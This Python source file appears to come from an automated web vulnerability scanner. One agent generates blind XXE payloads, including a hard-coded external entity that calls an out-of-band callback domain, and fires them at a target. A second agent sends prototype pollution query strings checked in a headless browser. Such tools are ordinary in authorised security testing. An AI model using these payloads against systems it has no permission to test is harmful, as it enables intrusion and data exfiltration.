from pathlib import Path
from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.llm_client import llm_client
from bugtrace.core.job_manager import JobStatus
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.agents.base import BaseAgent
from typing import List, Dict, Optional
import asyncio

logger = get_logger("agents.specialists")

# ==============================================================================
# XXE SPECIALIST V3 (Advanced reasoning + OOB Validation)
# ==============================================================================
class XXEAgent(BaseAgent):
    """
    Advanced XXE Agent that uses LLM reasoning and OOB validation.
    Capabilities:
    - Detects XML parsing logic even in non-obvious inputs
    - Generates OOB payloads (Blind XXE)
    - Validates via Interactsh callback
    """
    
    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None):
        super().__init__("XXEAgent", "XML Exploitation Specialist")
        self.url = url
        self.params = params if params is not None else [] # Fixed: Default empty list for params
        self.report_dir = report_dir or Path("./reports")
        self.interactsh = None
        
    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] ðŸ¦… Initiating Deep XXE Resonance on {self.url}...", "INFO")

        # Setup OOB channel
        oob_domain = await self._xxe_setup_oob()

        # Generate payloads
        payloads = await self._xxe_generate_payloads(oob_domain)

        # Execute attacks and collect findings
        findings = await self._xxe_execute_attacks(payloads, oob_domain)

        await self.interactsh.deregister()
        return {"findings": findings, "status": JobStatus.COMPLETED}

    async def _xxe_setup_oob(self) -> str:
        """Setup OOB listener for blind XXE detection."""
        self.interactsh = InteractshClient()
        await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
        oob_domain = self.interactsh.domain
        dashboard.log(f"[{self.name}] OOB Listener active: {oob_domain}", "INFO")
        return oob_domain

    async def _xxe_generate_payloads(self, oob_domain: str) -> List[str]:
        """Generate XXE payloads via LLM or use fallback."""
        prompt = f"""
        TARGET: {self.url}
        PARAMS: {self.params}
        OOB_DOMAIN: {oob_domain}

        You are an expert in XXE (XML External Entity) attacks.
        Generate 3 distinct payloads to test for Blind XXE.
        1. Basic Entity Injection (OOB HTTP Request)
        2. Parameter Entity Injection (Remote DTD)
        3. SOAP/API adaptation if applicable

        Return ONLY the payloads using XML format:
        <payload>payload1</payload>
        <payload>payload2</payload>
        """

        try:
            response = await self.exec_tool("LLM_Generation", llm_client.generate, prompt, module_name="XXEAgent", timeout=45)

            from bugtrace.utils.parsers import XmlParser
            payloads = XmlParser.extract_list(response, "payload")
            if not payloads:
                raise ValueError("No XML payloads found")
            return payloads

        except Exception:
            return [f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://{oob_domain}/xxe">]><root>&test;</root>']

    async def _xxe_execute_attacks(self, payloads: List[str], oob_domain: str) -> List[Dict]:
        """Execute XXE attacks with generated payloads."""
        findings = []

        for i, payload in enumerate(payloads):
            dashboard.set_status("XXE Attack", f"Payload {i+1}/{len(payloads)}")

            # Test all parameters
            for param in self.params:
                await self.exec_tool(
                    f"Injection_{i}",
                    self._send_xxe_payload,
                    param,
                    payload,
                    timeout=20,
                    default_return=None
                )

            # Check for OOB callback
            await asyncio.sleep(2)
            await self.interactsh.poll()

            if self.interactsh.check_url_hit("xxe") or len(self.interactsh.interactions) > 0:
                dashboard.log(f"[{self.name}] ðŸŽ¯ XXE BLIND CALLBACK RECEIVED!", "CRITICAL")
                findings.append(self._xxe_build_finding(payload))
                break  # Stop after confirmed exploit

        return findings

    def _xxe_build_finding(self, payload: str) -> Dict:
        """Build XXE finding report."""
        return {
            "type": "XXE (Blind)",
            "url": self.url,
            "evidence": "Interactsh OOB Callback received",
            "payload": payload,
            "severity": "CRITICAL",
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "description": f"Blind XML External Entity (XXE) injection confirmed via Out-of-Band (OOB) callback. The server parsed malicious XML and made an external request to our Interactsh server, confirming the vulnerability.",
            "reproduction": f"# Blind XXE with OOB exfiltration:\ncurl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:200]}...'"
        }

    async def _send_xxe_payload(self, param, payload):
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        # 1. GET Injection
        parsed = urlparse(self.url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        params[param] = payload
        target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params), parsed.fragment))
        
        try:
            # Use orchestrator for lifecycle-tracked connections
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.get(target_url, timeout=10) as resp:
                    pass # We only care about the OOB callback
        except Exception: # Catch specific exceptions if possible
            pass

        # 2. POST Injection (Content-Type switch) technique
        try:
            # Use orchestrator for lifecycle-tracked connections
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Try sending as XML body
                async with session.post(
                    self.url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=10
                ) as resp:
                    pass
        except Exception: # Catch specific exceptions if possible
            pass


# ==============================================================================
# PROTOTYPE POLLUTION V3 (Browser-Native Validation)
# ==============================================================================
class ProtoAgent(BaseAgent):
    """
    Prototype Pollution Specialist.
    Uses Browser logic to verify if injecting __proto__ affects JS execution.
    """
    
    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None):
        super().__init__("ProtoAgent", "Client-Side PP Specialist")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        
    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] Checking Prototype Pollution...", "INFO")

        findings = []

        # Setup probe properties and payloads
        probe_prop, payloads = self._proto_prepare_payloads()

        # Execute browser-based verification
        attack_url = await self._proto_test_payloads(payloads, probe_prop)

        # Fallback reflection check
        if attack_url:
            await self._check_reflection(attack_url, probe_prop)

        return {"findings": findings, "status": JobStatus.COMPLETED}

    def _proto_prepare_payloads(self) -> tuple:
        """Prepare prototype pollution probe properties and payloads."""
        probe_prop = "bugtrace_pp"
        probe_val = "1337"

        payloads = [
            f"__proto__[{probe_prop}]={probe_val}",
            f"__proto__.{probe_prop}={probe_val}",
            f"constructor[prototype][{probe_prop}]={probe_val}"
        ]

        return probe_prop, payloads

    async def _proto_test_payloads(self, payloads: List[str], probe_prop: str) -> Optional[str]:
        """Test all payloads with browser verification."""
        from bugtrace.tools.visual.verifier import XSSVerifier
        verifier = XSSVerifier(headless=True)

        attack_url = None
        for payload in payloads:
            char = "&" if "?" in self.url else "?"
            attack_url = f"{self.url}{char}{payload}"

            dashboard.set_status("Proto Attack", f"Testing {payload[:20]}...")

            await self.exec_tool(
                "Browser_Check",
                verifier.verify_xss,
                attack_url,
                str(self.report_dir),
                timeout=40,
                default_return=None
            )

        return attack_url

    async def _check_reflection(self, attack_url: str, probe_prop: str):
        """Check if payload is reflected in response text."""
        try:
            # Use orchestrator for lifecycle-tracked connections
            async with orchestrator.session(DestinationType.TARGET) as session:
                text = await self._fetch_response_text(session, attack_url)
                # Guard: Early return if fetch failed
                if text is None:
                    return
                # Guard: Early return if property detection conditions not met
                if not (f"{probe_prop}" in text and "__proto__" not in text and "constructor" not in text):
                    return
                # If payload was consumed but prop remains... uncertain evidence
                pass
        except Exception:
            pass

    async def _fetch_response_text(self, session, url: str):
        """Fetch response text from URL."""
        try:
            async with session.get(url) as resp:
                return await resp.text()
        except Exception:
            return None
